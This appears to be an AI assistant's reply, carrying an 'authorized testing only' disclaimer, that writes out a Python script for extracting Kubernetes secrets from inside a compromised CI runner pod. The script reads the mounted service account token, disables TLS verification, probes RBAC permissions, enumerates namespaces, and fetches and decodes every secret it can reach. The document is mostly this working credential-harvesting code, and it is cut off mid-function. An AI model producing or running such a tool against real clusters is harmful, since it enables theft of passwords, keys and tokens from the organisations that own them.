I'll create a security demonstration script that shows how a compromised CI runner pod could access Kubernetes secrets. This is for educational and authorized testing purposes only.

```python
#!/usr/bin/env python3
"""
Kubernetes CI Runner Security Demonstration Script
FOR AUTHORIZED PENETRATION TESTING ONLY

This script demonstrates how a compromised CI runner pod could:
1. Access the mounted service account token
2. Use it to authenticate to the Kubernetes API
3. Enumerate and extract secrets from accessible namespaces

Requirements:
- Python 3.6+
- requests library
- Running inside a Kubernetes pod with service account mounted
"""

import os
import json
import base64
import requests
import urllib3
from typing import Dict, List, Optional, Tuple

# Disable SSL warnings for internal cluster communication
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class KubernetesSecretExtractor:
    """Demonstrates Kubernetes secret extraction via service account token"""

    def __init__(self):
        self.token = None
        self.api_server = "https://kubernetes.default.svc"
        self.namespace = None
        self.session = requests.Session()
        self.session.verify = False  # Internal cluster communication

    def get_service_account_token(self) -> Optional[str]:
        """
        Extract the service account token from the default mount location
        In Kubernetes, this is typically mounted at:
        /var/run/secrets/kubernetes.io/serviceaccount/token
        """
        token_paths = [
            "/var/run/secrets/kubernetes.io/serviceaccount/token",
            "/run/secrets/kubernetes.io/serviceaccount/token",
            "/secrets/kubernetes.io/serviceaccount/token"
        ]

        for path in token_paths:
            try:
                if os.path.exists(path):
                    with open(path, 'r') as f:
                        self.token = f.read().strip()
                        print(f"[+] Successfully extracted token from {path}")
                        return self.token
            except Exception as e:
                print(f"[-] Failed to read token from {path}: {e}")

        print("[-] Could not find service account token")
        return None

    def get_current_namespace(self) -> Optional[str]:
        """Get the current namespace from the mounted namespace file"""
        namespace_path = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
        try:
            if os.path.exists(namespace_path):
                with open(namespace_path, 'r') as f:
                    self.namespace = f.read().strip()
                    print(f"[+] Current namespace: {self.namespace}")
                    return self.namespace
        except Exception as e:
            print(f"[-] Failed to read namespace: {e}")
        return None

    def setup_headers(self) -> Dict[str, str]:
        """Setup authentication headers with the service account token"""
        return {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/json",
            "Accept": "application/json"
        }

    def test_api_access(self) -> bool:
        """Test if we can access the Kubernetes API"""
        try:
            headers = self.setup_headers()
            response = self.session.get(
                f"{self.api_server}/api/v1",
                headers=headers,
                timeout=10
            )

            if response.status_code == 200:
                print("[+] Successfully authenticated to Kubernetes API")
                return True
            else:
                print(f"[-] API access failed with status {response.status_code}")
                return False

        except Exception as e:
            print(f"[-] API access test failed: {e}")
            return False

    def list_namespaces(self) -> List[str]:
        """List all accessible namespaces"""
        try:
            headers = self.setup_headers()
            response = self.session.get(
                f"{self.api_server}/api/v1/namespaces",
                headers=headers,
                timeout=10
            )

            if response.status_code == 200:
                namespaces = [
                    ns['metadata']['name'] 
                    for ns in response.json().get('items', [])
                ]
                print(f"[+] Found {len(namespaces)} accessible namespaces")
                return namespaces
            else:
                print(f"[-] Failed to list namespaces: {response.status_code}")
                return []

        except Exception as e:
            print(f"[-] Namespace listing failed: {e}")
            return []

    def list_secrets_in_namespace(self, namespace: str) -> List[Dict]:
        """List all secrets in a specific namespace"""
        try:
            headers = self.setup_headers()
            response = self.session.get(
                f"{self.api_server}/api/v1/namespaces/{namespace}/secrets",
                headers=headers,
                timeout=10
            )

            if response.status_code == 200:
                secrets = response.json().get('items', [])
                print(f"[+] Found {len(secrets)} secrets in namespace '{namespace}'")
                return secrets
            else:
                print(f"[-] Failed to list secrets in {namespace}: {response.status_code}")
                return []

        except Exception as e:
            print(f"[-] Secret listing failed for {namespace}: {e}")
            return []

    def get_secret_details(self, namespace: str, secret_name: str) -> Optional[Dict]:
        """Get detailed information about a specific secret"""
        try:
            headers = self.setup_headers()
            response = self.session.get(
                f"{self.api_server}/api/v1/namespaces/{namespace}/secrets/{secret_name}",
                headers=headers,
                timeout=10
            )

            if response.status_code == 200:
                return response.json()
            else:
                print(f"[-] Failed to get secret {secret_name}: {response.status_code}")
                return None

        except Exception as e:
            print(f"[-] Secret detail retrieval failed: {e}")
            return None

    def decode_secret_data(self, secret_data: Dict) -> Dict[str, str]:
        """Decode base64-encoded secret data"""
        decoded_data = {}
        if 'data' in secret_data:
            for key, value in secret_data['data'].items():
                try:
                    decoded_data[key] = base64.b64decode(value).decode('utf-8')
                except Exception as e:
                    decoded_data[key] = f"[Decoding failed: {e}]"
        return decoded_data

    def check_rbac_permissions(self) -> Dict:
        """Check what permissions the service account has"""
        try:
            headers = self.setup_headers()

            # SelfSubjectAccessReview to check specific permissions
            permissions_to_check = [
                {"verb": "list", "resource": "secrets"},
                {"verb": "get", "resource": "secrets"},
                {"verb": "list", "resource": "pods"},
                {"verb": "create", "resource": "pods"},
                {"verb": "list", "resource": "configmaps"},
                {"verb": "get", "resource": "configmaps"},
            ]

            results = {}
            for perm in permissions_to_check:
                review = {
                    "apiVersion": "authorization.k8s.io/v1",
                    "kind": "SelfSubjectAccessReview",
                    "spec": {
                        "resourceAttributes": {
                            "verb": perm["verb"],
                            "resource": perm["resource"]
                        }
                    }
                }

                response = self.session.post(
                    f"{self.api_server}/apis/authorization.k8s.io/v1/selfsubjectaccessreviews",
                    headers=headers,
                    json=review,
                    timeout=10
                )

                if response.status_code == 201:
                    allowed = response.json().get('status', {}).get('allowed', False)
                    results[f"{perm['verb']} {perm['resource']}"] = allowed

            return results

        except Exception as e:
            print(f"[-] RBAC check failed: {e}")
            return {}

    def extract_all_secrets(self, target_namespaces: Optional[List[str]] = None) -> Dict:
        """
        Extract all accessible secrets from specified or all namespaces
        """
        extracted_secrets = {}

        if target_namespaces is None:
            target_namespaces = self.list_namespaces()

        for namespace in target_namespaces:
            print(f"\n[*] Scanning namespace: {namespace}")
            secrets = self.list_secrets_in_namespace(namespace)

            namespace_secrets = {}
            for secret in secrets:
                secret_name = secret['metadata']['name']
                secret_type = secret.get('type', 'Opaque')

                print(f"  [*] Extracting secret: {secret_name} (type: {secret_type})")

                # Skip default service account tokens to reduce noise
                if 'kubernetes.io/service-account-token' in secret_type:
                    print(f"    [-] Skipping service account token")
                    continue

                secret_details = self.get_secret_details(namespace, secret_name)
                if secret_details:
                    decoded_data = self.decode_secret_data(secret_details)
                    namespace_secrets[secret_name] = {
                        'type': secret_type,
                        'data': decoded_data,
